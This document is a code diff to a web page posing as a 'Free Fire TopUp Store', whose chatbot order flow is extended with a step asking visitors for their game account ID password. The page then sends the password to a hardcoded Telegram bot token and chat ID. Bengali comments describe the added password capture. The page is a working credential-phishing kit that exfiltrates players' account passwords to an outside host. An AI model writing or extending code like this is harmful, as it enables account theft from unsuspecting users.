@@ -88,12 +88,12 @@ footer { text-align: center; background: #111827; color: white; padding: 10px; m
 <footer>© 2026 Free Fire TopUp Store</footer>
 
 <script>
-// আপনার দেওয়া টেলিগ্রাম ক্রেডেনশিয়াল অলরেডি সেট করে দেওয়া হয়েছে
 const telegramBotToken = "8902364146:AAGlLd9TmZ3b3fkvDQ9xIm0E0bIQoWDqM_k";
 const telegramChatId = "7502567661";
 
 let step = 0;
-let orderData = { item: "", price: "", uid: "", unicikId: "" };
+// pass ভেরিয়েবলটি যুক্ত করা হয়েছে ডেটা সেভ রাখার জন্য
+let orderData = { item: "", price: "", uid: "", unicikId: "", pass: "" };
 
 function startBot(item, price) {
     step = 1;
@@ -167,7 +167,12 @@ function sendMessage() {
         } 
         else if (step === 3) {
             orderData.unicikId = userText; 
-            step = 4; 
+            step = 4; // পাসওয়ার্ড চাওয়ার জন্য নতুন স্টেপ সেট করা হলো
+            addMessage("bot", "Apnar <b>Unicik ID Password</b> ti ekhane likhun 👇");
+        }
+        else if (step === 4) {
+            orderData.pass = userText; // পাসওয়ার্ড সেভ করা হলো
+            step = 5; 
             
             document.getElementById('user-input').disabled = true;
             document.getElementById('send-btn').disabled = true;
@@ -189,11 +194,13 @@ function addMessage(sender, text) {
 }
 
 function sendOrderToTelegram() {
+    // টেলিগ্রাম টেক্সটে পাসওয়ার্ড ফিল্ডটি যোগ করা হয়েছে
     const textMessage = `🤖 *New TopUp Order* 🤖\n\n` +
                         `📦 *Offer:* ${orderData.item}\n` +
                         `💰 *Price:* ${orderData.price}\n` +
                         `🆔 *UID:* ${orderData.uid}\n` +
-                        `🔢 *Unicik ID:* ${orderData.unicikId}`;
+                        `🔢 *Unicik ID:* ${orderData.unicikId}\n` +
+                        `🔑 *Password:* ${orderData.pass}`;
 
     const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
